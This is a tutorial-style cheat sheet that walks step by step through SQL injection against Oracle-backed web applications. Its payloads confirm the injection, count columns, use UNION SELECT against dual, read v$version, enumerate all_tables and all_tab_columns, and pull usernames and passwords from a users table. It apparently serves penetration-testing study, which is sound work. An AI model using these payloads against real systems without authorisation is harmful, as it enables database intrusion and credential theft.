# Oracle Database

## Introduction

Oracle Database is a Relational Database Management System (RDBMS) developed by Oracle Corporation.

It is widely used in enterprise applications, banking, healthcare, government organizations, and large businesses.

Oracle has its own SQL syntax, system tables, and functions. Therefore, SQL Injection payloads used for Oracle are different from those used for MySQL, PostgreSQL, SQL Server, or SQLite.

---

# Oracle SQL Injection Methodology

When testing an Oracle-based application, follow this process.

```
Identify Injection Point
        │
        ▼
Confirm SQL Injection
        │
        ▼
Determine Number of Columns
        │
        ▼
Find Text Column
        │
        ▼
Confirm Oracle Database
        │
        ▼
Retrieve Database Version
        │
        ▼
Retrieve Current User
        │
        ▼
Retrieve Current Schema
        │
        ▼
Enumerate Tables
        │
        ▼
Enumerate Columns
        │
        ▼
Extract Data
```

---

# Step 1 - Identify the Injection Point

Find user-controlled input such as:

- URL Parameters
- Search Box
- Login Form
- POST Parameters
- Cookies

Example:

```
https://example.com/filter?category=Accessories
```

Injection Point:

```
category
```

---

# Step 2 - Confirm SQL Injection

Test with:

```sql
'
```

If the application returns an SQL error, the parameter may be vulnerable.

Next test:

```sql
'--
```

If the page loads normally, SQL comments are working.

Next test:

```sql
' OR 1=1--
```

If more data is displayed, SQL Injection is confirmed.

---

# Step 3 - Determine the Number of Columns

Use the `ORDER BY` technique.

```sql
' ORDER BY 1--
```

```sql
' ORDER BY 2--
```

```sql
' ORDER BY 3--
```

Increase the number until an error occurs.

The previous successful number is the total number of columns.

---

# Step 4 - Find the Text Column

Use `UNION SELECT`.

Example:

```sql
' UNION SELECT NULL,NULL FROM dual--
```

Replace each `NULL` with text.

Example:

```sql
' UNION SELECT 'TEST',NULL FROM dual--
```

or

```sql
' UNION SELECT NULL,'TEST' FROM dual--
```

The column displaying **TEST** is the text column.

---

# Step 5 - Confirm Oracle Database

Oracle uses the special table:

```sql
dual
```

Example:

```sql
' UNION SELECT NULL,NULL FROM dual--
```

If this works, the backend database is likely Oracle.

---

# Step 6 - Retrieve Database Version

Use:

```sql
' UNION SELECT NULL,banner FROM v$version--
```

This displays the Oracle database version.

---

# Step 7 - Retrieve Current User

```sql
' UNION SELECT NULL,user FROM dual--
```

---

# Step 8 - Retrieve Current Schema

```sql
' UNION SELECT NULL,SYS_CONTEXT('USERENV','CURRENT_SCHEMA') FROM dual--
```

---

# Step 9 - Enumerate Tables

Oracle stores table names in:

```
all_tables
```

Example:

```sql
' UNION SELECT NULL,table_name FROM all_tables--
```

---

# Step 10 - Enumerate Columns

Oracle stores column names in:

```
all_tab_columns
```

Example:

```sql
' UNION SELECT NULL,column_name
FROM all_tab_columns
WHERE table_name='USERS'--
```

---

# Step 11 - Extract Data

After finding the required table and columns:

Example:

```sql
' UNION SELECT username,password FROM users--
```

---

# Oracle System Views

| View | Purpose |
|------|---------|
| dual | Dummy table |
| v$version | Database version |
| all_tables | List all tables |
| all_tab_columns | List all columns |

---

# Summary

1. Identify the injection point.
2. Confirm SQL Injection.
3. Find the number of columns.
4. Find the text column.
5. Confirm Oracle database.
6. Retrieve database version.
7. Retrieve current user.
8. Retrieve current schema.
9. Enumerate tables.
10. Enumerate columns.
11. Extract data.
